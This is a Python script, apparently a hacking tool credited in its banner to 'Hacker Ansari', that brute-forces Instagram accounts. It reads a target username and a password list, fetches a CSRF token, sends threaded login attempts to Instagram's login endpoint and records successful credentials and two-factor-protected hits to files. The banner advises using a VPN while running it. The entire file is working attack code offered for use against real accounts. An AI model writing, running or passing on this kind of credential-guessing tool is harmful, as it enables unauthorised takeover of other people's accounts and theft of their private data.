from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input
CheckVersion = str(sys.version)
import re
from datetime import datetime



print('''
                              .::!!!!!!!:.
  .!!!!!:.                        .:!!!!!!!!!!!!
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
        "*$bd$$$$      '*$$$$$$$$$$$o+#"
        _
     /\                        (_)
    /  \   _ __  ___  __ _ _ __ _
   / /\ \ | '_ \/ __|/ _` | '__| |
  / ____ \| | | \__ \ (_| | |  | |
 /_/    \_\_| |_|___/\__,_|_|  |_|


Author   : Hacker Ansari
Github : https://github.com/hacker_ansari_07
instagram : https://instagram.com/hacker_ansari_07
Thank you for using this tool

Management depends on vpn software. Please use it before running the tool

           
           """""""""""""""""""""""""""""""""""""""""" 
''')


class InstaBrute(object):
    def __init__(self):

        try:
            user = input('instagram username : ')
            Combo = input('entre your passList : ')
            print('\n----------------------------')
          
        except:
            print(' The tool was arrested exit ')
            sys.exit()


        with open(Combo, 'r') as x:
            Combolist = x.read().splitlines()
        thread = []
        self.Coutprox = 0
        for combo in Combolist:
            password = combo.split(':')[0]
            t = threading.Thread(target=self.New_Br, args=(user, password))
            t.start()
            thread.append(t)
            time.sleep(0.9)
        for j in thread:
            j.join()

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def New_Br(self,user,pwd):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time = int(datetime.now().timestamp())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            r = s.get(link)
            csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": csrf
            })
            print(f'{user}:{pwd}\n----------------------------')
    
            if 'authenticated": true' in r.text:
                print(('' + user + ':' + pwd + ' --> Good hack '))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
            elif 'two_factor_required' in r.text:   
                print(('' + user + ':' + pwd + ' -->  Good It has to be checked '))
                with open('results_NeedVerfiy.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')



InstaBrute()
